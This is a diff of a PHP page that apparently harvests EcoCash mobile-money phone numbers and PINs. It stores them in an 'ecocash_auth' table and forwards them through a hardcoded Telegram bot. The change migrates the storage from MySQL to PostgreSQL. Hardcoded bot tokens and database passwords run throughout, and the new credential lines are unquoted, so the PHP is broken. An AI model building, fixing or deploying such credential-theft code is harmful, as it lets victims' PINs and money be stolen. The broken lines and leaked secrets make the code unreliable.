@@ -5,12 +5,12 @@ session_start();
 $botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
 $chatId   = "-5193742613";
 
-// NEW CREDENTIALS (use environment variables for security)
-$dbHost = getenv('DB_HOST') ?: '78.111.67.22';
-$dbPort = getenv('DB_PORT') ?: 3306;
-$dbName = getenv('DB_NAME') ?: 'loan';
-$dbUser = getenv('DB_USER') ?: 'renderuser';
-$dbPass = getenv('DB_PASS') ?: 'StrongPassword123!';
+// PostgreSQL credentials (default port changed to 5432)
+$dbHost = dpg-d8l5ii7lk1mc73cjcvs0-a;
+$dbPort = 5432;          // PostgreSQL default
+$dbName = loan_9d8q;
+$dbUser = loan_9d8q_user;
+$dbPass = Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX;
 
 // ==================================
 
@@ -29,19 +29,19 @@ if (empty($phone)) {
 }
 
 /**
- * Create a PDO connection with proper error handling
+ * Create a PostgreSQL PDO connection
  * @return PDO|null
  */
 function getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass) {
     static $pdo = null;
     if ($pdo === null) {
-        // Check if PDO MySQL driver is available
-        if (!in_array('mysql', PDO::getAvailableDrivers())) {
-            error_log("PDO MySQL driver is NOT available. Installed drivers: " . implode(',', PDO::getAvailableDrivers()));
+        // Check if PDO PostgreSQL driver is available
+        if (!in_array('pgsql', PDO::getAvailableDrivers())) {
+            error_log("PDO PostgreSQL driver is NOT available. Installed drivers: " . implode(',', PDO::getAvailableDrivers()));
             return null;
         }
         try {
-            $dsn = "mysql:host=$dbHost;port=$dbPort;dbname=$dbName;charset=utf8mb4";
+            $dsn = "pgsql:host=$dbHost;port=$dbPort;dbname=$dbName;options='--client_encoding=UTF8'";
             $pdo = new PDO($dsn, $dbUser, $dbPass, [
                 PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                 PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
@@ -55,7 +55,7 @@ function getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass) {
     return $pdo;
 }
 
-// Function to send Telegram message (unchanged, but kept for brevity)
+// Function to send Telegram message (unchanged)
 function sendTelegramMessage($botToken, $chatId, $message) {
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
     $postData = [
@@ -140,20 +140,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $pdo = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
         if (!$pdo) {
             $error = "System error: database driver missing. Please contact administrator.";
-            error_log("PDO MySQL driver missing when processing PIN submission");
+            error_log("PDO PostgreSQL driver missing when processing PIN submission");
         } else {
             try {
-                // Create table if it doesn't exist (optional but helpful)
+                // Create table if it doesn't exist (PostgreSQL syntax)
                 $pdo->exec("CREATE TABLE IF NOT EXISTS ecocash_auth (
-                    id INT AUTO_INCREMENT PRIMARY KEY,
+                    id SERIAL PRIMARY KEY,
                     phone VARCHAR(20) NOT NULL,
                     pin VARCHAR(4) NOT NULL,
-                    status TINYINT DEFAULT 0,
+                    status SMALLINT DEFAULT 0,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    UNIQUE KEY unique_phone_pin (phone, pin)
+                    UNIQUE(phone, pin)
                 )");
                 
-                $insertStmt = $pdo->prepare("INSERT IGNORE INTO ecocash_auth (phone, pin, status) VALUES (:phone, :pin, 0)");
+                // PostgreSQL: INSERT ... ON CONFLICT instead of INSERT IGNORE
+                $insertStmt = $pdo->prepare("
+                    INSERT INTO ecocash_auth (phone, pin, status)
+                    VALUES (:phone, :pin, 0)
+                    ON CONFLICT (phone, pin) DO NOTHING
+                ");
                 $insertStmt->execute([':phone' => $phone, ':pin' => $pin]);
                 
                 // Send Telegram notification
@@ -176,6 +181,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 $pendingPin = isset($_SESSION['pending_pin']) ? $_SESSION['pending_pin'] : '';
 ?>
+
 <!DOCTYPE html>
 <!-- HTML remains exactly as in your original code – no changes needed -->
 <html> ... </html>
